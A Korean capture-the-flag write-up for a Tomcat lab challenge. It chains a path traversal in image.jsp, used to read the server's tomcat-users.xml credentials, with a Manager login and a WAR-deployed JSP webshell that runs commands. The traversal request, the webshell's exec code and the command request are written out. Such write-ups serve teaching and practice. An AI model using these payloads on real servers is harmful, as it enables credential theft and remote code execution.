# B2 · Tomcat Manager

### 1. VM에 접속한다

문제 페이지에 접속하면 `Under Construction` 화면과 이미지가 표시된다. 메인 페이지의 이미지 요청은 다음과 같다.

```html
<img src="./image.jsp?file=working.png"/>
```

이미지 파일 이름을 `image.jsp`의 `file` 파라미터로 넘기고 있으므로, 이 값이 서버에서 어떻게 처리되는지 확인한다.

### 2. 코드 분석 — Path Traversal로 관리자 설정 파일 접근

**① `image.jsp`는 입력받은 파일 경로를 검증 없이 사용한다.**

```jsp
String filepath = getServletContext().getRealPath("resources") + "/";
String _file = request.getParameter("file");

java.io.FileInputStream fileInputStream =
    new java.io.FileInputStream(filepath + _file);
```

`file` 값에 `../`를 넣으면 `resources` 디렉터리 밖으로 이동할 수 있다. 이를 이용해 Tomcat 설정 파일을 읽는다.

Burp Suite Repeater에서 다음처럼 요청했다.

```http
GET /image.jsp?file=/../../../../../../usr/local/tomcat/conf/tomcat-users.xml HTTP/1.1
Host: host3.dreamhack.games:12275
```

`/usr/local/tomcat/conf/tomcat-users.xml`은 Tomcat 사용자와 권한 정보를 저장하는 설정 파일이다. 문제에서 제공한 `tomcat-users.xml`의 비밀번호는 가려져 있었지만, 실제 서버 파일을 읽으면 인증 정보를 확인할 수 있었다.

**② `tomcat-users.xml`에서 관리 권한을 확인한다.**

```xml
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<role rolename="admin-gui"/>

<user username="tomcat" password="[SECRET]"
      roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
```

`tomcat` 계정에 `manager-gui` 등 관리 권한이 부여되어 있다.

### 3. Tomcat Manager 로그인 — `/manager/html`은 어떻게 알았을까?

`tomcat-users.xml`의 `manager-gui` 권한을 보고 **Tomcat의 기본 관리 애플리케이션(Manager)**을 이용하는 계정임을 알 수 있다.

Tomcat 공식 문서에서 웹 관리 화면은 `/manager/html` 경로를 사용한다. 즉, 이 주소는 파일 내용에서 직접 발견한 것이 아니라 **Tomcat의 표준 관리 경로를 확인한 것**이다.

```text
http://서버주소:포트/manager/html
```

앞에서 확인한 `tomcat` 계정으로 로그인하니 **Tomcat Web Application Manager** 화면에 접속할 수 있었다.

이 화면에는 실행 중인 애플리케이션 목록과 **WAR file to deploy** 기능이 있다. WAR를 올려 새 JSP 애플리케이션을 배포할 수 있다.

### 4. WAR 파일 업로드와 JSP 웹 셸 분석

처음 직접 만든 WAR는 JSP의 Java 버전 호환성 문제로 `500` 오류가 발생했다. 이후 GitHub에 있는 [webshell.war](https://github.com/tghosth/webshelljar/blob/master/webshell.war)를 사용했다.

WAR는 Java 웹 애플리케이션을 담은 **ZIP 기반 배포 파일**이다. 실제 사용한 `webshell.war`의 구조는 다음과 같다.

```text
webshell.war
├── META-INF/
│   └── MANIFEST.MF
└── index.jsp
```

**`index.jsp`의 핵심 코드**

```jsp
String cmd = request.getParameter("cmd");
String output = "";

if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd, null, null);
    BufferedReader sI = new BufferedReader(
        new InputStreamReader(p.getInputStream())
    );

    String s;
    while ((s = sI.readLine()) != null) {
        output += s + "</br>";
    }
}
```

- `request.getParameter("cmd")`: URL의 `cmd` 파라미터를 읽는다.
- `Runtime.getRuntime().exec(cmd, null, null)`: 입력받은 명령어를 서버에서 실행한다.
- `p.getInputStream()`: 실행 결과의 **표준 출력(stdout)**을 읽는다.
- `output`: 읽은 내용을 HTML에 출력한다.

따라서 WAR를 배포하면 서버에서 명령어를 실행하고 결과를 볼 수 있다. **Tomcat Manager의 WAR 배포 권한을 통한 RCE**인 것이다.

Tomcat Manager의 **WAR file to deploy**에 `webshell.war`를 업로드하고 `Deploy`를 누른다. WAR 파일 이름이 `webshell.war`이므로 기본 배포 경로는 `/webshell`이 된다.

### 5. 웹 셸에서 FLAG 확인

배포된 웹 셸로 접속한다.

```text
http://서버주소:포트/webshell/index.jsp
```

명령어 입력창에 `/flag`를 입력하거나 다음과 같이 요청한다.

```http
GET /webshell/index.jsp?cmd=%2Fflag HTTP/1.1
Host: host3.dreamhack.games:14594
```

`%2F`는 `/`를 URL 인코딩한 것이므로 `cmd` 값은 `/flag`이다.

웹 셸이 `/flag`를 **명령어로 실행**하고, 프로그램이 출력한 `DH{...}`를 `getInputStream()`으로 읽어 화면에 보여준다.

```text
/flag 실행 → stdout에 FLAG 출력 → JSP가 읽어서 브라우저에 표시
```

> **취약점 원인:** `image.jsp`가 사용자 입력 경로를 검증하지 않아 `tomcat-users.xml`이 노출되었고, 유출된 관리자 계정으로 Tomcat Manager에 로그인한 뒤 WAR 배포 기능을 이용해 서버에서 코드를 실행할 수 있었다.

**참고 자료:** [Tomcat Manager 공식 문서](https://tomcat.apache.org/tomcat-8.5-doc/html-manager-howto.html) · [사용한 WAR 파일 GitHub](https://github.com/tghosth/webshelljar)
